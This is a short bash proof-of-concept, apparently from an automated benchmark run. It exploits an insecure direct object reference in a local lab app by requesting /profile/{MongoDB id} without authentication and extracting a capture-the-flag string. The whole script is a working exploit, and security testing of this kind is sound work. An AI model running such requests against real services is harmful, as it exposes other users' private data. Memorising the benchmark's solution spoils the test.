#!/bin/bash
# POC: Demonstrates IDOR vulnerability - accessing user profiles without authentication by directly specifying MongoDB ObjectId in URL
# Target: ./repo
# Created: 2025-12-01T16:12:38.660Z
# Session: benchmark-XBEN-099-24-minc74t1

# IDOR Vulnerability POC - Profile Endpoint Unauthorized Access
# Demonstrates that the /profile/{userId} endpoint allows unauthenticated access to any user profile
# Target: http://localhost:3000/profile/{userId}

TARGET_URL="http://localhost:3000"
FIRST_USER_ID="692dbe531cc493c06cd752a1"

echo "[*] IDOR Vulnerability POC - Profile Endpoint"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing unauthorized access to user profile..."
echo ""

# Test 1: Access first user profile without authentication
echo "[*] Test 1: Accessing first user profile (ID: $FIRST_USER_ID) without authentication"
echo "[*] Request: GET $TARGET_URL/profile/$FIRST_USER_ID"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/profile/$FIRST_USER_ID")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] Response Status Code: $HTTP_CODE"
echo ""
echo "[*] Response Body:"
echo "$BODY"
echo ""

# Check for success indicators
if echo "$BODY" | grep -q "Welcome, user0"; then
    echo "[+] SUCCESS: Accessed user profile without authentication!"
    echo "[+] Vulnerability Confirmed: Unauthenticated users can access any profile"
    
    # Check for flag or sensitive data
    if echo "$BODY" | grep -q "flag{"; then
        echo "[+] CRITICAL: Sensitive data (flag) found in profile response!"
        FLAG=$(echo "$BODY" | grep -oP 'flag\{[^}]*\}')
        echo "[+] Flag extracted: $FLAG"
    fi
    
    exit 0
else
    echo "[-] FAILED: Could not access user profile"
    echo "[-] This may indicate the vulnerability has been patched or the server is not responding correctly"
    exit 1
fi